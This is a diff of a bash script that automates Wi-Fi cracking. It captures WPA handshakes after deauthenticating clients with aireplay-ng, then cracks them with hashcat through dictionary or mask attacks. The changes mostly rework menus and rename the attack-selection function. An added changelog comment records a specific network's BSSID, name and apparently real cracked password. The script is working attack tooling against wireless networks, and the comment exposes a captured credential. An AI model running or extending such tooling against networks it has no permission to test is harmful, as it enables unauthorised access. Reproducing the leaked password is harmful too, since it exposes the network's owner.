@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.5.2 20/5/25 09:30
+# version: 3.5.2 21/5/25 00:30
 
 
 ### Changlog ###
@@ -8,6 +8,11 @@
 
 ### FIX ###
 	# delay between scan to output
+
+# Remove password not cracked if we cracked it later
+#We got handshake for (66:20:E3:14:C4:4E): Ico2G                                    at 00:14 21/05/25
+#The Wi-Fi password is:   Jgs8g2#1F+
+#Password not cracked with Brute-Force of this masking: Jgs?d?l?d#?u
 
 ### To Do ###
 	# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
@@ -359,7 +364,7 @@ function choose_network() {
         if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
             echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
             echo -e "Choose different Attack..\n"
-            choose_password_attack
+            choose_attack
         fi
 
         # If we only captured the handshake from previous scan
@@ -369,7 +374,7 @@ function choose_network() {
                 sudo pkill aireplay-ng
                 sudo pkill airodump-ng
                 cleanup
-                choose_password_attack
+                choose_attack
                 exit 1   
             else
                 rm -r $targets_path/"$bssid_name" 
@@ -397,7 +402,7 @@ function validate_network() {
     found=0
     echo -n "Checking"
     
-    for (( i=0; i<15; i++ )); do
+    for (( i=0; i<20; i++ )); do
         if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
             found=1
             echo -e "\n\e[1;32mNetwork available!\e[0m"
@@ -480,7 +485,7 @@ function devices_scanner() {
             echo --- >> "$targets_path/wifi_passwords.txt"
             printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
             cleanup
-            choose_password_attack
+            choose_attack
         fi
 
         sleep 1
@@ -620,25 +625,34 @@ function crack_wep() {
 # -------------------------
 
 function dictionary_attack() {
-    # Ask user if they want to use the default Rockyou wordlist
-    echo -e "\n\033[1mUse Rockyou wordlist (Y) or Choose different wordlist (n) ?\033[0m"
-    read -r use_rockyou
+while true; do
+    echo -e "\n\033[1mChoose a wordlist:\033[0m"
+    echo "1. Use rockyou.txt"
+    echo "2. Use a different dictionary"
+    read -p "Enter your choice (1 or 2): " wordlist_choice
 
-    if [[ "$use_rockyou" =~ ^[Nn]$ ]]; then
-        # Ask for custom dictionary file path
-        read -e -p "Enter the full path to your custom dictionary file: " custom_dict
-        if [ ! -f "$custom_dict" ]; then
-            echo -e "\e[1;31mError:\e[0m File does not exist. Exiting..."
-            exit 1
-        fi
-        dict_file="$custom_dict"
-    else
-        # Use default Rockyou path
-        dict_file="$rockyou_file"
-    fi
+    case "$wordlist_choice" in
+        1)
+            dict_file="$rockyou_file"
+            break
+            ;;
+        2)
+            read -e -p "Enter the full path to your custom dictionary file: " custom_dict
+            if [ -f "$custom_dict" ]; then
+                dict_file="$custom_dict"
+                break
+            else
+                echo -e "\e[1;31mError:\e[0m File does not exist. Please try again."
+            fi
+            ;;
+        *)
+            echo -e "\e[1;31mInvalid choice. Please enter 1 or 2.\e[0m"
+            ;;
+    esac
+done
 
-    echo -e "\e[1m\nCracking Wi-Fi password using: $dict_file ->>\n\e[0m"
-    
+echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
+
     gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
     "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
     --outfile \"$targets_path/$bssid_name/$bssid_name-wifi_password.txt\" \
@@ -913,22 +927,51 @@ function enable_gpu() {
 function another_scan_prompt() {
     while true; do
         echo
-        read -p "Do you want to run another scan? (Y/n): " answer
+        echo -e "\e[1mWhat would you like to do next ?\e[0m"
+        echo "1. Choose different network to attack"
+        echo "2. Run new Scan"
+        echo "3. Exit"
+        read -p "Enter your choice (1-3): " choice
         echo
-        case $answer in
-            [Yy]* )
+        case $choice in
+            1)
+                choose_network
+                devices_scanner
+	
+		if [[ "$encryption" == "WPA3 WPA2" ]]; then            
+		    mixed_encryption
+		fi    
+
+		deauth_attack
+		cleanup
+		
+		hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
+		if [ ! -f "$targets_path/$bssid_name/hash.hc22000" ]; then
+		    echo '❌ Failed to create hash.hc22000 for hashcat.';
+		    echo 'Check if you captured the EAPOL handshake or PMKID.';
+		    echo -e 'Look at the airodump_output.txt file for details. \nExiting.\n\n';
+		    exit 1	       
+		fi	
+		
+		choose_attack
+                break
+                ;;
+            2)
                 main_process
-                break ;;
-            [Nn]* )
+                break
+                ;;
+            3)
                 echo -e "\nBye."
                 cleanup
-                exit 1 ;;
-            * )
-                echo "Invalid input. Please answer yes or no (Y/n)."
+                exit 1
+                ;;
+            *)
+                echo "Invalid input. Please enter 1-3."
                 ;;
         esac
     done
 }
+
 
 
 # ------------------------------
@@ -942,9 +985,9 @@ function cleanup() {
 
 
 # ------------------------------
-# Choose Password Attack
+# Choose Attack
 # ------------------------------
-function choose_password_attack() {
+function choose_attack() {
 	while true; do
 	    echo -e "\n\033[1;33mChoose how to crack the password:\e[0m"
 	    echo "1) Dictionary attack"
@@ -992,7 +1035,7 @@ function main_process() {
 	    exit 1	       
 	fi	
 	
-	choose_password_attack
+	choose_attack
 }
 
 install_dependencies
